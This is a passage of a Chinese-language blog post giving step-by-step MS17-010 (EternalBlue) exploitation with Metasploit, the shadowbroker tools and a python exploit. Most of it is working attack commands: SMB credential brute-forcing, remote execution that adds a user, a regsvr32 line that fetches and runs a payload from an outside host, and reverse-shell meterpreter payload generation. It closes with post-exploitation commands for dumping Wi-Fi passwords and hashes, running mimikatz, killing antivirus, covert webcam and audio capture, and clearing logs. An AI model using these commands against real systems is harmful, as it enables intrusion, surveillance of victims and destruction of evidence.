+auxiliary/scanner/smb/pipe_auditor 模块找寻你需要的pipe</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">use auxiliary/scanner/smb/pipe_auditor
+set rhosts 10.10.10.19
+set threads 20
+exploit</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-26_18-27-02.jpg" alt="" /><br />
+<strong>2.username and password</strong></p>
+
+<p><code>USERNAME = ''</code><br />
+<code>PASSWORD = ''</code><br />
+只需要更改系统中存在的共享smb账户,无论权限多低</p>
+
+<p>那么我们怎么找到对应的账户呢,使用如下两种,当然使用自己写python脚本更佳啊</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">msfconsole
+use auxiliary/scanner/smb/smb_login
+set rhosts 10.10.10.0-255
+set USER_FILE user.txt
+set PSSS_FILE pass.txt
+exploit</pre></td></tr></table>
+</div>
+</div>
+<p><code>hydra -L user.txt -P pass.txt -t 20 10.10.10.10 smb</code></p>
+
+<p>注意: 此脚本最关键地方</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">    print(&#39;creating file c:\\pwned.txt on the target&#39;)
+    tid2 = smbConn.connectTree(&#39;C$&#39;)
+    fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)
+    smbConn.closeFile(tid2, fid2)
+    smbConn.disconnectTree(tid2)
+
+#   smb_send_file(smbConn, sys.argv[0], &#39;C&#39;, &#39;/exp.txt&#39;)
+    service_exec(conn, r&#39;cmd /c net user test test /add&#39;)</pre></td></tr></table>
+</div>
+</div>
+<p>如果测试成功,会发现c盘新建了一个pwned.txt文件,同时会执行命令<code>net user test test /add</code></p>
+
+<p>如果觉得繁琐,可以用powershell/regsvr32等等执行脚本内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">use exploit/multi/script/web_delivery
+set target 3
+set payload windows/meterpreter/bind_tcp
+set rhost 10.10.10.19
+exploit
+
+regsvr32 /s /n /u /i:http://192.168.2.164:8080/5Msr8HdNh.sct scrobj.dll</pre></td></tr></table>
+</div>
+</div>
+<p>在python代码更改成如下即可</p>
+
+<p><code>service_exec(conn, r'cmd /c regsvr32 /s /n /u /i:http://192.168.2.164:8080/5Msr8HdNh.sct scrobj.dll')</code></p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-21_18-17-13.jpg" alt="" /></p>
+
+<hr />
+
+<h2 id="二-eternalblue-doublepulsar-metasploit">二.Eternalblue-Doublepulsar-Metasploit</h2>
+
+<p><a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit/</a></p>
+
+<p>修改eternalblue_doublepulsar.rb中成自己的目录,修改完成后，我们将rb文件放到metasploit的目录exploit/windows/smb/</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">    register_options([
+        OptEnum.new(&#39;TARGETARCHITECTURE&#39;, [true,&#39;Target Architecture&#39;,&#39;x86&#39;,[&#39;x86&#39;,&#39;x64&#39;]]),
+        OptString.new(&#39;ETERNALBLUEPATH&#39;,[true,&#39;Path directory of Eternalblue&#39;,&#39;/root/Eternalblue-Doublepulsar-Metasploit/deps/&#39;]),
+        OptString.new(&#39;DOUBLEPULSARPATH&#39;,[true,&#39;Path directory of Doublepulsar&#39;,&#39;/root/Eternalblue-Doublepulsar-Metasploit/deps/&#39;]),
+        OptString.new(&#39;WINEPATH&#39;,[true,&#39;WINE drive_c path&#39;,&#39;/root/.wine/drive_c/&#39;]),
+        OptString.new(&#39;PROCESSINJECT&#39;,[true,&#39;Name of process to inject into (Change to lsass.exe for x64)&#39;,&#39;wlms.exe&#39;])
+    ], self.class)</pre></td></tr></table>
+</div>
+</div>
+<p>启动msf后使用<code>reload_all</code>命令重新加载模块</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">msfvemon -p windows/meterpreter/reverse_tcp lhost=192.168.12.110 lport=4444 -f dll -o /root/.wine/drive_c/eternal11.dll
+
+msfconsole
+reload_all
+search eternalblue_doublepulsar.rb
+use exploit/windows/smb/eternalblue_doublepulsar
+set RHOST 192.168.56.101
+set Payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.56.102
+exploit</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/basic-options.png" alt="" /></p>
+
+<h2 id="https-img-04z-net-img-meterpreter-session-png"><img src="https://img.04z.net/img/meterpreter-session_.png" alt="" /></h2>
+
+<h2 id="三-python3之ms17-010-py">三.python3之ms17-010.py</h2>
+
+<p>下载地址：<a href="http://blackwolfsec.cc/static/code/ms17-010.py">http://blackwolfsec.cc/static/code/ms17-010.py</a><br />
+From: blackwolf</p>
+
+<p>文件内容必须为shellcode格式（dll会蓝屏），shellcode生成方式</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">1.nc reverse shellcode:  &#34;msfvenom -p windows/x64/shell_reverse_tcp   LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode&#34;
+2.meterpreter reverse shellcode:  &#34;msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode&#34;</pre></td></tr></table>
+</div>
+</div>
+<p>使用方法:<br />
+python3 ms17-010.py &ndash;host x.x.x.x &ndash;file ./shellcode<br />
+参考链接:<br />
+<a href="https://www.exploit-db.com/exploits/41987/">https://www.exploit-db.com/exploits/41987/</a><br />
+<a href="https://github.com/RiskSense-Ops/MS17-010/tree/master/exploits/eternalblue">https://github.com/RiskSense-Ops/MS17-010/tree/master/exploits/eternalblue</a></p>
+
+<hr />
+
+<h2 id="四-ms17010命令行版本">四.ms17010命令行版本</h2>
+
+<p><a href="https://github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a></p>
+
+<p>**准备工作： **</p>
+
+<p>把 windows/lib/x86-windows 路径下所有的dll拷贝到 windows/specials/ 和 windows/payloads/这两个目录下<br />
+把 windows/specials/ 下的  Eternalblue-2.2.0.0.xml 改名为 Eternalblue-2.2.0.xml<br />
+把 windows/payloads/ 下的  Doublepulsar-1.3.1.0.xml  改名为 Doublepulsar-1.3.1.xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">开启监听并生成shell_dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.14.129 LPORT=4455 -f dll &gt; /root/Desktop/test_64.dll
+msfconsole -q -X &#34;use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.14.129; set lport 4455; run;&#34;
+
+扫描探测
+F:\shadowbroker\windows\specials\Eternalblue-2.2.0.exe --TargetIp 192.168.14.132 --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig E:\\Users\\Test\\Desktop\\445.txt
+
+执行攻击
+F:\shadowbroker\windows\payloads\Doublepulsar-1.3.1.exe --OutConfig E:\\Users\\Test\\Desktop\\446.txt --TargetIp 192.168.14.132 --TargetPort 445 --DllPayload F:\\eeeter\\windows\\payloads\\test_64.dll --DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-17_22-10-14.jpg" alt="" /></p>
+
+<h2 id="五-ms17-010-eternalblue">五.ms17_010_eternalblue</h2>
+
+<p>至于防火墙可以通过https和dns的payload走就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">use exploit/windows/smb/ms17_010_eternalblue
+set payload windows/meterpreter/bind_tcp
+set rhost x.x.x.x
+exploit</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-26_18-36-53.jpg" alt="" /></p>
+
+<h2 id="六-ms17-010-psexec">六.ms17_010_psexec</h2>
+
+<p>全版本通杀,至于为什么.因为有依赖条件.必须是禁止密码保护共享的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">exploit/windows/smb/ms17_010_psexec
+set payload windows/meterpreter/bind_tcp
+set rhost x.x.x.x
+exploit</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-26_18-38-24.jpg" alt="" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">好久没玩都快忘光了,一些命令再记下...
+for /f &#34;skip=9 tokens=1,2 delims=:&#34; %i in (&#39;netsh wlan show profiles&#39;) do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear //无线密码
+load mimikatz &amp;&amp; wdigest //抓取明文密码
+bgrun killav //杀掉杀毒软件
+webcam_list //查看有没有摄像头
+bgrun webcam //启动摄像头
+webcam_snap -i 1 -v false //启动摄像头拍摄一张照片但不打开闪光灯
+bgrun sound_recorder //启动声音录制
+bgrun hashdump //获取哈希值
+bgrun vnc //启动vnc连接
+screenshot //对目标系统桌面进行截屏
+clearev //清除日志</pre></td></tr></table>
+</div>
+</div>
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/powershell-load-exe-into-memory/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Powershell-Load-Exe-Into-Memory</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/execl-scriptlets-attack/">
+            <span class="next-text nav-default">Execl Scriptlets Attack</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
